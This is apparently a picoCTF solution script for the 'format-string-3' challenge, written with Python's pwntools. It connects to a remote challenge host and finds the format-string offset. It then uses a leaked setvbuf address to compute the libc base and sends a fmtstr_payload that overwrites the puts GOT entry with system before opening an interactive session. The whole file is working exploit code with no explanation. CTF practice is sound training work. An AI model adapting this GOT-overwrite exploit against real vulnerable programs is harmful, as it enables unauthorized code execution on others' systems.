from pwn import *

context.binary = ELF('./format-string-3')

p = remote('rhea.picoctf.net', 56083)
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 56083)
    p.sendline(payload)
    return p.recvall()
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc = ELF("./libc.so.6")
libc.address = setvbuf_leak - libc.symbols['setvbuf']

sys_addr = libc.symbols['system']
puts_addr = context.binary.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()